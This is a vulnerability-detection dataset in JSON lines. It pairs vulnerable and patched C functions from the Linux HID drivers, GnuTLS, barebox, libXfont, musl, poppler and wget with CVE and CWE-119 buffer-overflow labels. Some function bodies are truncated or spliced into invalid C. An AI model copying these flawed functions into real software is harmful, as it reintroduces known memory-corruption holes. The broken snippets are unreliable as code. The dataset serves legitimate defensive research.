{\n\t\t\tmemcpy(data->pending->raw_data, raw_data+1, size-1);\n\t\t\tdata->pending->raw_size  = size-1;\n\t\t\tdata->pending->in_report = report;\n\t\t\tcomplete(&data->pending->ready);\n\t\t}\n\t\tspin_unlock_irqrestore(&data->lock, flags);\n\t}\n\n\tpicolcd_debug_raw_event(data, hdev, report, raw_data, size);\n\treturn 1;\n}\n", "func_hash": 88186924224606894712660001209578635664, "file_name": "hid-picolcd_core.c", "file_hash": 54398981253658973866116694089898364478, "cwe": ["CWE-119"], "cve": "CVE-2014-3186", "cve_desc": "Buffer overflow in the picolcd_raw_event function in devices/hid/hid-picolcd_core.c in the PicoLCD HID device driver in the Linux kernel through 3.16.3, as used in Android on Nexus 7 devices, allows physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted device that sends a large report.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3186"}
{"idx": 159025, "project": "linux", "commit_id": "4ab25786c87eb20857bbb715c3ae34ec8fd6a214", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/4ab25786c87eb20857bbb715c3ae34ec8fd6a214", "commit_message": "HID: fix a couple of off-by-ones\n\nThere are a few very theoretical off-by-one bugs in report descriptor size\nchecking when performing a pre-parsing fixup. Fix those.\n\nCc: stable@vger.kernel.org\nReported-by: Ben Hawkes <hawkes@google.com>\nReviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>", "target": 0, "func": " static __u8 *ch_report_fixup(struct hid_device *hdev, __u8 *rdesc,\n \t\tunsigned int *rsize)\n {\n\tif (*rsize >= 18 && rdesc[11] == 0x3c && rdesc[12] == 0x02) {\n \t\thid_info(hdev, \"fixing up Cherry Cymotion report descriptor\\n\");\n \t\trdesc[11] = rdesc[16] = 0xff;\n \t\trdesc[12] = rdesc[17] = 0x03;\n\t}\n\treturn rdesc;\n}\n", "func_hash": 256834588490855446076505549688746966197, "file_name": "hid-cherry.c", "file_hash": 95105781901221436155724086271945955559, "cwe": ["CWE-119"], "cve": "CVE-2014-3184", "cve_desc": "The report_fixup functions in the HID subsystem in the Linux kernel before 3.16.2 might allow physically proximate attackers to cause a denial of service (out-of-bounds write) via a crafted device that provides a small report descriptor, related to (1) drivers/hid/hid-cherry.c, (2) drivers/hid/hid-kye.c, (3) drivers/hid/hid-lg.c, (4) drivers/hid/hid-monterey.c, (5) drivers/hid/hid-petalynx.c, and (6) drivers/hid/hid-sunplus.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3184"}
{"idx": 159026, "project": "linux", "commit_id": "4ab25786c87eb20857bbb715c3ae34ec8fd6a214", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/4ab25786c87eb20857bbb715c3ae34ec8fd6a214", "commit_message": "HID: fix a couple of off-by-ones\n\nThere are a few very theoretical off-by-one bugs in report descriptor size\nchecking when performing a pre-parsing fixup. Fix those.\n\nCc: stable@vger.kernel.org\nReported-by: Ben Hawkes <hawkes@google.com>\nReviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>", "target": 0, "func": "static __u8 *kye_report_fixup(struct hid_device *hdev, __u8 *rdesc,\n\t\tunsigned int *rsize)\n{\n\tswitch (hdev->product) {\n\tcase USB_DEVICE_ID_KYE_ERGO_525V:\n\t\t/* the fixups that need to be done:\n\t\t *   - change led usage page to button for extra buttons\n\t\t *   - report size 8 count 1 must be size 1 count 8 for button\n\t\t *     bitfield\n \t\t *   - change the button usage range to 4-7 for the extra\n \t\t *     buttons\n \t\t */\n\t\tif (*rsize >= 75 &&\n \t\t\trdesc[61] == 0x05 && rdesc[62] == 0x08 &&\n \t\t\trdesc[63] == 0x19 && rdesc[64] == 0x08 &&\n \t\t\trdesc[65] == 0x29 && rdesc[66] == 0x0f &&\n\t\t\trdesc[71] == 0x75 && rdesc[72] == 0x08 &&\n\t\t\trdesc[73] == 0x95 && rdesc[74] == 0x01) {\n\t\t\thid_info(hdev,\n\t\t\t\t \"fixing up Kye/Genius Ergo Mouse \"\n\t\t\t\t \"report descriptor\\n\");\n\t\t\trdesc[62] = 0x09;\n\t\t\trdesc[64] = 0x04;\n\t\t\trdesc[66] = 0x07;\n\t\t\trdesc[72] = 0x01;\n\t\t\trdesc[74] = 0x08;\n\t\t}\n\t\tbreak;\n\tcase USB_DEVICE_ID_KYE_EASYPEN_I405X:\n\t\tif (*rsize == EASYPEN_I405X_RDESC_ORIG_SIZE) {\n\t\t\trdesc = easypen_i405x_rdesc_fixed;\n\t\t\t*rsize = sizeof(easypen_i405x_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\tcase USB_DEVICE_ID_KYE_MOUSEPEN_I608X:\n\t\tif (*rsize == MOUSEPEN_I608X_RDESC_ORIG_SIZE) {\n\t\t\trdesc = mousepen_i608x_rdesc_fixed;\n\t\t\t*rsize = sizeof(mousepen_i608x_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\tcase USB_DEVICE_ID_KYE_EASYPEN_M610X:\n\t\tif (*rsize == EASYPEN_M610X_RDESC_ORIG_SIZE) {\n\t\t\trdesc = easypen_m610x_rdesc_fixed;\n\t\t\t*rsize = sizeof(easypen_m610x_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\tcase USB_DEVICE_ID_GENIUS_GILA_GAMING_MOUSE:\n\t\trdesc = kye_consumer_control_fixup(hdev, rdesc, rsize, 104,\n\t\t\t\t\t\"Genius Gila Gaming Mouse\");\n\t\tbreak;\n\tcase USB_DEVICE_ID_GENIUS_GX_IMPERATOR:\n\t\trdesc = kye_consumer_control_fixup(hdev, rdesc, rsize, 83,\n\t\t\t\t\t\"Genius Gx Imperator Keyboard\");\n\t\tbreak;\n\tcase USB_DEVICE_ID_GENIUS_MANTICORE:\n\t\trdesc = kye_consumer_control_fixup(hdev, rdesc, rsize, 104,\n\t\t\t\t\t\"Genius Manticore Keyboard\");\n\t\tbreak;\n\t}\n\treturn rdesc;\n}\n", "func_hash": 10461272926352127171126962700267976879, "file_name": "hid-kye.c", "file_hash": 203442816039038892495284947516200817278, "cwe": ["CWE-119"], "cve": "CVE-2014-3184", "cve_desc": "The report_fixup functions in the HID subsystem in the Linux kernel before 3.16.2 might allow physically proximate attackers to cause a denial of service (out-of-bounds write) via a crafted device that provides a small report descriptor, related to (1) drivers/hid/hid-cherry.c, (2) drivers/hid/hid-kye.c, (3) drivers/hid/hid-lg.c, (4) drivers/hid/hid-monterey.c, (5) drivers/hid/hid-petalynx.c, and (6) drivers/hid/hid-sunplus.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3184"}
{"idx": 159027, "project": "linux", "commit_id": "4ab25786c87eb20857bbb715c3ae34ec8fd6a214", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/4ab25786c87eb20857bbb715c3ae34ec8fd6a214", "commit_message": "HID: fix a couple of off-by-ones\n\nThere are a few very theoretical off-by-one bugs in report descriptor size\nchecking when performing a pre-parsing fixup. Fix those.\n\nCc: stable@vger.kernel.org\nReported-by: Ben Hawkes <hawkes@google.com>\nReviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>", "target": 0, "func": "static __u8 *lg_report_fixup(struct hid_device *hdev, __u8 *rdesc,\n\t\tunsigned int *rsize)\n{\n\tstruct lg_drv_data *drv_data = hid_get_drvdata(hdev);\n \tstruct usb_device_descriptor *udesc;\n \t__u16 bcdDevice, rev_maj, rev_min;\n \n\tif ((drv_data->quirks & LG_RDESC) && *rsize >= 91 && rdesc[83] == 0x26 &&\n \t\t\trdesc[84] == 0x8c && rdesc[85] == 0x02) {\n \t\thid_info(hdev,\n \t\t\t \"fixing up Logitech keyboard report descriptor\\n\");\n \t\trdesc[84] = rdesc[89] = 0x4d;\n \t\trdesc[85] = rdesc[90] = 0x10;\n \t}\n\tif ((drv_data->quirks & LG_RDESC_REL_ABS) && *rsize >= 51 &&\n \t\t\trdesc[32] == 0x81 && rdesc[33] == 0x06 &&\n \t\t\trdesc[49] == 0x81 && rdesc[50] == 0x06) {\n \t\thid_info(hdev,\n\t\t\t \"fixing up rel/abs in Logitech report descriptor\\n\");\n\t\trdesc[33] = rdesc[50] = 0x02;\n\t}\n\n\tswitch (hdev->product) {\n\n\t/* Several wheels report as this id when operating in emulation mode. */\n\tcase USB_DEVICE_ID_LOGITECH_WHEEL:\n\t\tudesc = &(hid_to_usb_dev(hdev)->descriptor);\n\t\tif (!udesc) {\n\t\t\thid_err(hdev, \"NULL USB device descriptor\\n\");\n\t\t\tbreak;\n\t\t}\n\t\tbcdDevice = le16_to_cpu(udesc->bcdDevice);\n\t\trev_maj = bcdDevice >> 8;\n\t\trev_min = bcdDevice & 0xff;\n\n\t\t/* Update the report descriptor for only the Driving Force wheel */\n\t\tif (rev_maj == 1 && rev_min == 2 &&\n\t\t\t\t*rsize == DF_RDESC_ORIG_SIZE) {\n\t\t\thid_info(hdev,\n\t\t\t\t\"fixing up Logitech Driving Force report descriptor\\n\");\n\t\t\trdesc = df_rdesc_fixed;\n\t\t\t*rsize = sizeof(df_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\n\tcase USB_DEVICE_ID_LOGITECH_MOMO_WHEEL:\n\t\tif (*rsize == MOMO_RDESC_ORIG_SIZE) {\n\t\t\thid_info(hdev,\n\t\t\t\t\"fixing up Logitech Momo Force (Red) report descriptor\\n\");\n\t\t\trdesc = momo_rdesc_fixed;\n\t\t\t*rsize = sizeof(momo_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\n\tcase USB_DEVICE_ID_LOGITECH_MOMO_WHEEL2:\n\t\tif (*rsize == MOMO2_RDESC_ORIG_SIZE) {\n\t\t\thid_info(hdev,\n\t\t\t\t\"fixing up Logitech Momo Racing Force (Black) report descriptor\\n\");\n\t\t\trdesc = momo2_rdesc_fixed;\n\t\t\t*rsize = sizeof(momo2_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\n\tcase USB_DEVICE_ID_LOGITECH_VIBRATION_WHEEL:\n\t\tif (*rsize == FV_RDESC_ORIG_SIZE) {\n\t\t\thid_info(hdev,\n\t\t\t\t\"fixing up Logitech Formula Vibration report descriptor\\n\");\n\t\t\trdesc = fv_rdesc_fixed;\n\t\t\t*rsize = sizeof(fv_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\n\tcase USB_DEVICE_ID_LOGITECH_DFP_WHEEL:\n\t\tif (*rsize == DFP_RDESC_ORIG_SIZE) {\n\t\t\thid_info(hdev,\n\t\t\t\t\"fixing up Logitech Driving Force Pro report descriptor\\n\");\n\t\t\trdesc = dfp_rdesc_fixed;\n\t\t\t*rsize = sizeof(dfp_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\n\tcase USB_DEVICE_ID_LOGITECH_WII_WHEEL:\n\t\tif (*rsize >= 101 && rdesc[41] == 0x95 && rdesc[42] == 0x0B &&\n\t\t\t\trdesc[47] == 0x05 && rdesc[48] == 0x09) {\n\t\t\thid_info(hdev, \"fixing up Logitech Speed Force Wireless report descriptor\\n\");\n\t\t\trdesc[41] = 0x05;\n\t\t\trdesc[42] = 0x09;\n\t\t\trdesc[47] = 0x95;\n\t\t\trdesc[48] = 0x0B;\n\t\t}\n\t\tbreak;\n\t}\n\n\treturn rdesc;\n}\n", "func_hash": 332754560908671207217151475475941392800, "file_name": "hid-lg.c", "file_hash": 208620246657497986001353256568567664160, "cwe": ["CWE-119"], "cve": "CVE-2014-3184", "cve_desc": "The report_fixup functions in the HID subsystem in the Linux kernel before 3.16.2 might allow physically proximate attackers to cause a denial of service (out-of-bounds write) via a crafted device that provides a small report descriptor, related to (1) drivers/hid/hid-cherry.c, (2) drivers/hid/hid-kye.c, (3) drivers/hid/hid-lg.c, (4) drivers/hid/hid-monterey.c, (5) drivers/hid/hid-petalynx.c, and (6) drivers/hid/hid-sunplus.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3184"}
{"idx": 1, "project": "savannah", "commit_id": "190cef6eed37d0e73a73c1e205eb31d45ab60a3c", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls.git;a=commitdiff;h=190cef6eed37d0e73a73c1e205eb31d45ab60a3c", "commit_message": "None", "target": 1, "func": "gnutls_session_get_data (gnutls_session_t session,\n                         void *session_data, size_t * session_data_size)\n{\n\n  gnutls_datum_t psession;\n  int ret;\n\n  if (session->internals.resumable == RESUME_FALSE)\n    return GNUTLS_E_INVALID_SESSION;\n\n  psession.data = session_data;\n\n  ret = _gnutls_session_pack (session, &psession);\n  if (ret < 0)\n    {\n       gnutls_assert ();\n       return ret;\n     }\n  *session_data_size = psession.size;\n \n   if (psession.size > *session_data_size)\n     {\n       ret = GNUTLS_E_SHORT_MEMORY_BUFFER;\n       goto error;\n     }\n \n   if (session_data != NULL)\n     memcpy (session_data, psession.data, psession.size);\n\n  ret = 0;\n\nerror:\n  _gnutls_free_datum (&psession);\n  return ret;\n}\n", "func_hash": 266005388725654386397960628110885023158, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2011-4128", "cve_desc": "Buffer overflow in the gnutls_session_get_data function in lib/gnutls_session.c in GnuTLS 2.12.x before 2.12.14 and 3.x before 3.0.7, when used on a client that performs nonstandard session resumption, allows remote TLS servers to cause a denial of service (application crash) via a large SessionTicket.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-4128"}
{"idx": 2, "project": "savannah", "commit_id": "e82ef4545e9e98cbcb032f55d7c750b81e3a0450", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls.git;a=commitdiff;h=e82ef4545e9e98cbcb032f55d7c750b81e3a0450", "commit_message": "None", "target": 1, "func": "gnutls_session_get_data (gnutls_session_t session,\n                         void *session_data, size_t * session_data_size)\n{\n\n  gnutls_datum_t psession;\n  int ret;\n\n  if (session->internals.resumable == RESUME_FALSE)\n    return GNUTLS_E_INVALID_SESSION;\n\n  psession.data = session_data;\n\n  ret = _gnutls_session_pack (session, &psession);\n  if (ret < 0)\n    {\n      gnutls_assert ();\n      return ret;\n    }\n \n   if (psession.size > *session_data_size)\n     {\n       ret = GNUTLS_E_SHORT_MEMORY_BUFFER;\n       goto error;\n     }\n\n  if (session_data != NULL)\n    memcpy (session_data, psession.data, psession.size);\n\n  ret = 0;\n\nerror:\n  _gnutls_free_datum (&psession);\n  return ret;\n}\n", "func_hash": 162619476999663411812822607346255778028, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2011-4128", "cve_desc": "Buffer overflow in the gnutls_session_get_data function in lib/gnutls_session.c in GnuTLS 2.12.x before 2.12.14 and 3.x before 3.0.7, when used on a client that performs nonstandard session resumption, allows remote TLS servers to cause a denial of service (application crash) via a large SessionTicket.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-4128"}
{"idx": 41, "project": "pengutronix", "commit_id": "574ce994016107ad8ab0f845a785f28d7eaa5208", "project_url": "https://git.pengutronix.de/cgit/barebox/commit/fs/nfs.c?h=next&id=574ce994016107ad8ab0f845a785f28d7eaa5208", "commit_url": "https://git.pengutronix.de/cgit/barebox/commit/fs/nfs.c?h=next&id=574ce994016107ad8ab0f845a785f28d7eaa5208", "commit_message": "None", "target": 1, "func": "static int nfs_readlink_req(struct nfs_priv *npriv, struct nfs_fh *fh,\n\t\t\t    char **target)\n{\n\tuint32_t data[1024];\n\tuint32_t *p;\n\tuint32_t len;\n\tstruct packet *nfs_packet;\n\n\t/*\n\t * struct READLINK3args {\n\t * \tnfs_fh3 symlink;\n\t * };\n\t *\n\t * struct READLINK3resok {\n\t * \tpost_op_attr symlink_attributes;\n\t * \tnfspath3 data;\n\t * };\n\t *\n\t * struct READLINK3resfail {\n\t * \tpost_op_attr symlink_attributes;\n\t * }\n\t *\n\t * union READLINK3res switch (nfsstat3 status) {\n\t * case NFS3_OK:\n\t * \tREADLINK3resok resok;\n\t * default:\n\t * \tREADLINK3resfail resfail;\n\t * };\n\t */\n\tp = &(data[0]);\n\tp = rpc_add_credentials(p);\n\n\tp = nfs_add_fh3(p, fh);\n\n\tlen = p - &(data[0]);\n\n\tnfs_packet = rpc_req(npriv, PROG_NFS, NFSPROC3_READLINK, data, len);\n\tif (IS_ERR(nfs_packet))\n\t\treturn PTR_ERR(nfs_packet);\n\n\tp = (void *)nfs_packet->data + sizeof(struct rpc_reply) + 4;\n\n \tp = nfs_read_post_op_attr(p, NULL);\n \n \tlen = ntoh32(net_read_uint32(p)); /* new path length */\n \tp++;\n \n \t*target = xzalloc(len + 1);\n\treturn 0;\n}\n", "func_hash": 165064796667373419921312233428470052444, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2019-15938", "cve_desc": "Pengutronix barebox through 2019.08.1 has a remote buffer overflow in nfs_readlink_req in fs/nfs.c because a length field is directly used for a memcpy.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-15938"}
{"idx": 42, "project": "pengutronix", "commit_id": "84986ca024462058574432b5483f4bf9136c538d", "project_url": "https://git.pengutronix.de/cgit/barebox/commit/fs/nfs.c?h=next&id=574ce994016107ad8ab0f845a785f28d7eaa5208", "commit_url": "https://git.pengutronix.de/cgit/barebox/commit/net/nfs.c?h=next&id=84986ca024462058574432b5483f4bf9136c538d", "commit_message": "None", "target": 1, "func": "static int nfs_readlink_reply(unsigned char *pkt, unsigned len)\n {\n \tuint32_t *data;\n \tchar *path;\n\tint rlen;\n \tint ret;\n \n \tret = rpc_check_reply(pkt, 1);\n\tif (ret)\n\t\treturn ret;\n\n\tdata = (uint32_t *)(pkt + sizeof(struct rpc_reply));\n\n\tdata++;\n \n \trlen = ntohl(net_read_uint32(data)); /* new path length */\n \n \tdata++;\n \tpath = (char *)data;\n\t} else {\n\t\tmemcpy(nfs_path, path, rlen);\n\t\tnfs_path[rlen] = 0;\n\t}\n", "func_hash": 197742048742816713437466148600234690021, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2019-15937", "cve_desc": "Pengutronix barebox through 2019.08.1 has a remote buffer overflow in nfs_readlink_reply in net/nfs.c because a length field is directly used for a memcpy.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-15937"}
{"idx": 63, "project": "libxfont", "commit_id": "d11ee5886e9d9ec610051a206b135a4cdc1e09a0", "project_url": "https://cgit.freedesktop.org/xorg/lib/libXfont/commit/?id=d11ee5886e9d9ec610051a206b135a4cdc1e09a0", "commit_url": "https://cgit.freedesktop.org/xorg/lib/libXfont/commit/?id=d11ee5886e9d9ec610051a206b135a4cdc1e09a0", "commit_message": "None", "target": 1, "func": "BufCompressedFill (BufFilePtr f)\n{\n    CompressedFile  *file;\n    register char_type *stackp, *de_stack;\n    register char_type finchar;\n    register code_int code, oldcode, incode;\n    BufChar\t    *buf, *bufend;\n\n    file = (CompressedFile *) f->private;\n\n    buf = f->buffer;\n    bufend = buf + BUFFILESIZE;\n    stackp = file->stackp;\n    de_stack = file->de_stack;\n    finchar = file->finchar;\n    oldcode = file->oldcode;\n    while (buf < bufend) {\n\twhile (stackp > de_stack && buf < bufend)\n\t    *buf++ = *--stackp;\n\n\tif (buf == bufend)\n\t    break;\n\n\tif (oldcode == -1)\n\t    break;\n\n\tcode = getcode (file);\n\tif (code == -1)\n\t    break;\n    \n    \tif ( (code == CLEAR) && file->block_compress ) {\n\t    for ( code = 255; code >= 0; code-- )\n\t    \tfile->tab_prefix[code] = 0;\n\t    file->clear_flg = 1;\n\t    file->free_ent = FIRST - 1;\n\t    if ( (code = getcode (file)) == -1 )\t/* O, untimely death! */\n\t    \tbreak;\n    \t}\n    \tincode = code;\n    \t/*\n     \t * Special case for KwKwK string.\n     \t */\n    \tif ( code >= file->free_ent ) {\n\t    *stackp++ = finchar;\n\t    code = oldcode;\n    \t}\n    \n    \t/*\n     \t * Generate output characters in reverse order\n      \t */\n     \twhile ( code >= 256 )\n     \t{\n \t    *stackp++ = file->tab_suffix[code];\n \t    code = file->tab_prefix[code];\n     \t}\n    \n    \t/*\n     \t * Generate the new entry.\n     \t */\n    \tif ( (code=file->free_ent) < file->maxmaxcode ) {\n\t    file->tab_prefix[code] = (unsigned short)oldcode;\n\t    file->tab_suffix[code] = finchar;\n\t    file->free_ent = code+1;\n    \t} \n\t/*\n\t * Remember previous code.\n\t */\n\toldcode = incode;\n    }\n    file->oldcode = oldcode;\n    file->stackp = stackp;\n    file->finchar = finchar;\n    if (buf == f->buffer) {\n\tf->left = 0;\n\treturn BUFFILEEOF;\n    }\n    f->bufp = f->buffer + 1;\n    f->left = (buf - f->buffer) - 1;\n    return f->buffer[0];\n}\n", "func_hash": 314816336443270992925734214319385584087, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2011-2895", "cve_desc": "The LZW decompressor in (1) the BufCompressedFill function in fontfile/decompress.c in X.Org libXfont before 1.4.4 and (2) compress/compress.c in 4.3BSD, as used in zopen.c in OpenBSD before 3.8, FreeBSD, NetBSD 4.0.x and 5.0.x before 5.0.3 and 5.1.x before 5.1.1, FreeType 2.1.9, and other products, does not properly handle code words that are absent from the decompression table when encountered, which allows context-dependent attackers to trigger an infinite loop or a heap-based buffer overflow, and possibly execute arbitrary code, via a crafted compressed stream, a related issue to CVE-2006-1168 and CVE-2011-2896.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-2895"}
{"idx": 64, "project": "musl", "commit_id": "45ca5d3fcb6f874bf5ba55d0e9651cef68515395", "project_url": "https://git.musl-libc.org/cgit/musl/commit/?id=45ca5d3fcb6f874bf5ba55d0e9651cef68515395", "commit_url": "https://git.musl-libc.org/cgit/musl/commit/?id=45ca5d3fcb6f874bf5ba55d0e9651cef68515395", "commit_message": "None", "target": 1, "func": "static int dns_parse_callback(void *c, int rr, const void *data, int len, const void *packet)\n {\n \tchar tmp[256];\n \tstruct dpc_ctx *ctx = c;\n \tswitch (rr) {\n \tcase RR_A:\n \t\tif (len != 4) return -1;\n\t\tctx->addrs[ctx->cnt].scopeid = 0;\n\t\tmemcpy(ctx->addrs[ctx->cnt++].addr, data, 4);\n\t\tbreak;\n\tcase RR_AAAA:\n\t\tif (len != 16) return -1;\n\t\tctx->addrs[ctx->cnt].family = AF_INET6;\n\t\tctx->addrs[ctx->cnt].scopeid = 0;\n\t\tmemcpy(ctx->addrs[ctx->cnt++].addr, data, 16);\n\t\tbreak;\n\tcase RR_CNAME:\n\t\tif (__dn_expand(packet, (const unsigned char *)packet + 512,\n\t\t    data, tmp, sizeof tmp) > 0 && is_valid_hostname(tmp))\n\t\t\tstrcpy(ctx->canon, tmp);\n\t\tbreak;\n\t}\n\treturn 0;\n}\n", "func_hash": 212099417602244187828055587331477277729, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-15650", "cve_desc": "musl libc before 1.1.17 has a buffer overflow via crafted DNS replies because dns_parse_callback in network/lookup_name.c does not restrict the number of addresses, and thus an attacker can provide an unexpected number by sending A records in a reply to an AAAA query.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-15650"}
{"idx": 66, "project": "poppler", "commit_id": "b8682d868ddf7f741e93b791588af0932893f95c", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/utils/pdfseparate.cc?id=b8682d868ddf7f741e93b", "commit_message": "pdfseparate: improve the path building\n\nMake use of snprintf to limit the output to the pathName buffer;\nwhile I'm there, expand its size to 4096 (might help longer paths),\nalthough a better fix would be dynamically allocate its length\n(and/or using GooString, maybe).", "target": 1, "func": " bool extractPages (const char *srcFileName, const char *destFileName) {\n  char pathName[1024];\n   GooString *gfileName = new GooString (srcFileName);\n   PDFDoc *doc = new PDFDoc (gfileName, NULL, NULL, NULL);\n \n  if (!doc->isOk()) {\n    error(errSyntaxError, -1, \"Could not extract page(s) from damaged file ('{0:s}')\", srcFileName);\n    return false;\n  }\n\n  if (firstPage == 0 && lastPage == 0) {\n    firstPage = 1;\n    lastPage = doc->getNumPages();\n  }\n  if (lastPage == 0)\n    lastPage = doc->getNumPages();\n  if (firstPage == 0)\n    firstPage = 1;\n  if (firstPage != lastPage && strstr(destFileName, \"%d\") == NULL) {\n    error(errSyntaxError, -1, \"'{0:s}' must contain '%%d' if more than one page should be extracted\", destFileName);\n     return false;\n   }\n   for (int pageNo = firstPage; pageNo <= lastPage; pageNo++) {\n    sprintf (pathName, destFileName, pageNo);\n     GooString *gpageName = new GooString (pathName);\n     int errCode = doc->savePageAs(gpageName, pageNo);\n     if ( errCode != errNone) {\n      delete gpageName;\n      delete gfileName;\n      return false;\n    }\n    delete gpageName;\n  }\n  delete gfileName;\n  return true;\n}\n", "func_hash": 244634780333143587019078565382798831655, "file_name": "pdfseparate.cc", "file_hash": 64286020146444451993051060480447128164, "cwe": ["CWE-119"], "cve": "CVE-2013-4473", "cve_desc": "Stack-based buffer overflow in the extractPages function in utils/pdfseparate.cc in poppler before 0.24.2 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a source filename.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4473"}
{"idx": 96, "project": "savannah", "commit_id": "ba6b44f6745b14dce414761a8e4b35d31b176bba", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/wget.git/commit/?id=ba6b44f6745b14dce414761a8e4b35d31b176bba", "commit_message": "None", "target": 1, "func": "fd_read_body (const char *downloaded_filename, int fd, FILE *out, wgint toread, wgint startpos,\n\n              wgint *qtyread, wgint *qtywritten, double *elapsed, int flags,\n              FILE *out2)\n{\n  int ret = 0;\n#undef max\n#define max(a,b) ((a) > (b) ? (a) : (b))\n  int dlbufsize = max (BUFSIZ, 8 * 1024);\n  char *dlbuf = xmalloc (dlbufsize);\n\n  struct ptimer *timer = NULL;\n  double last_successful_read_tm = 0;\n\n  /* The progress gauge, set according to the user preferences. */\n  void *progress = NULL;\n\n  /* Non-zero if the progress gauge is interactive, i.e. if it can\n     continually update the display.  When true, smaller timeout\n     values are used so that the gauge can update the display when\n     data arrives slowly. */\n  bool progress_interactive = false;\n\n  bool exact = !!(flags & rb_read_exactly);\n\n  /* Used only by HTTP/HTTPS chunked transfer encoding.  */\n  bool chunked = flags & rb_chunked_transfer_encoding;\n  wgint skip = 0;\n\n  /* How much data we've read/written.  */\n  wgint sum_read = 0;\n  wgint sum_written = 0;\n  wgint remaining_chunk_size = 0;\n\n#ifdef HAVE_LIBZ\n  /* try to minimize the number of calls to inflate() and write_data() per\n     call to fd_read() */\n  unsigned int gzbufsize = dlbufsize * 4;\n  char *gzbuf = NULL;\n  z_stream gzstream;\n\n  if (flags & rb_compressed_gzip)\n    {\n      gzbuf = xmalloc (gzbufsize);\n      if (gzbuf != NULL)\n        {\n          gzstream.zalloc = zalloc;\n          gzstream.zfree = zfree;\n          gzstream.opaque = Z_NULL;\n          gzstream.next_in = Z_NULL;\n          gzstream.avail_in = 0;\n\n          #define GZIP_DETECT 32 /* gzip format detection */\n          #define GZIP_WINDOW 15 /* logarithmic window size (default: 15) */\n          ret = inflateInit2 (&gzstream, GZIP_DETECT | GZIP_WINDOW);\n          if (ret != Z_OK)\n            {\n              xfree (gzbuf);\n              errno = (ret == Z_MEM_ERROR) ? ENOMEM : EINVAL;\n              ret = -1;\n              goto out;\n            }\n        }\n      else\n        {\n          errno = ENOMEM;\n          ret = -1;\n          goto out;\n        }\n    }\n#endif\n\n  if (flags & rb_skip_startpos)\n    skip = startpos;\n\n  if (opt.show_progress)\n    {\n      const char *filename_progress;\n      /* If we're skipping STARTPOS bytes, pass 0 as the INITIAL\n         argument to progress_create because the indicator doesn't\n         (yet) know about \"skipping\" data.  */\n      wgint start = skip ? 0 : startpos;\n      if (opt.dir_prefix)\n        filename_progress = downloaded_filename + strlen (opt.dir_prefix) + 1;\n      else\n        filename_progress = downloaded_filename;\n      progress = progress_create (filename_progress, start, start + toread);\n      progress_interactive = progress_interactive_p (progress);\n    }\n\n  if (opt.limit_rate)\n    limit_bandwidth_reset ();\n\n  /* A timer is needed for tracking progress, for throttling, and for\n     tracking elapsed time.  If either of these are requested, start\n     the timer.  */\n  if (progress || opt.limit_rate || elapsed)\n    {\n      timer = ptimer_new ();\n      last_successful_read_tm = 0;\n    }\n\n  /* Use a smaller buffer for low requested bandwidths.  For example,\n     with --limit-rate=2k, it doesn't make sense to slurp in 16K of\n     data and then sleep for 8s.  With buffer size equal to the limit,\n     we never have to sleep for more than one second.  */\n  if (opt.limit_rate && opt.limit_rate < dlbufsize)\n    dlbufsize = opt.limit_rate;\n\n  /* Read from FD while there is data to read.  Normally toread==0\n     means that it is unknown how much data is to arrive.  However, if\n     EXACT is set, then toread==0 means what it says: that no data\n     should be read.  */\n  while (!exact || (sum_read < toread))\n    {\n      int rdsize;\n      double tmout = opt.read_timeout;\n\n      if (chunked)\n        {\n          if (remaining_chunk_size == 0)\n            {\n              char *line = fd_read_line (fd);\n              char *endl;\n              if (line == NULL)\n                {\n                  ret = -1;\n                  break;\n                }\n              else if (out2 != NULL)\n                fwrite (line, 1, strlen (line), out2);\n\n               remaining_chunk_size = strtol (line, &endl, 16);\n               xfree (line);\n \n               if (remaining_chunk_size == 0)\n                 {\n                   ret = 0;\n                        fwrite (line, 1, strlen (line), out2);\n                      xfree (line);\n                    }\n                  break;\n                }\n            }\n\n          